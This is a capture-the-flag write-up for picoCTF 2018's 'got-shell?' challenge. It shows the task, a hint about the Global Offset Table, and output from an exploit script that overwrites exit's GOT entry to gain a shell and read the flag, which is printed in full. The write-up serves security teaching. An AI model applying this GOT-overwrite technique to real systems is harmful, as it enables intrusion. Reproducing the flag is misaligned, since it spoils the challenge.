# got-shell? - Points: 350 - (Solves: 213)

Can you authenticate to this [service][1] and get the flag?
Connect to it with nc 2018shell2.picoctf.com 27952.
[Source][2]

[1]: https://2018shell2.picoctf.com/static/07209d42cd68512a23e58e1b82f649ba/auth
[2]: https://2018shell2.picoctf.com/static/07209d42cd68512a23e58e1b82f649ba/auth.c

## Hints

Ever heard of the Global Offset Table?

---

```sh
% python xpwn.py
[*] '/home/zzzz/auth'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Opening connection to 2018shell2.picoctf.com on port 27952: Done
[*] GOT  exit : 0x804a014
[*] ADDR win  : 0x804854b
[+] Rejoice me!
[*] Switching to interactive mode
total 20
-rwxr-sr-x 1 hacksports got-shell-_0 7600 Sep 28 07:48 auth
-rw-rw-r-- 1 hacksports hacksports    697 Sep 28 07:48 auth.c
-r--r----- 1 hacksports got-shell-_0   42 Sep 28 07:48 flag.txt
-rwxr-sr-x 1 hacksports got-shell-_0  113 Sep 28 07:48 xinet_startup.sh
$ cat flag.txt
picoCTF{m4sT3r_0f_tH3_g0t_t4b1e_d496409a}
```
